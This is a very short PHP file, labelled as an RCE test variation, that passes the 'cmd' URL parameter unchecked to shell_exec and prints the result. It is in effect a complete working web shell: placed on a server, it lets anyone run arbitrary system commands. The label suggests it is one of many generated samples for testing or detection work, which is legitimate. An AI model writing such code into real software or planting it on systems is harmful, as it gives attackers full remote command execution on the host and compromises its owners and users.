<?php
// RCE test variation #335
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>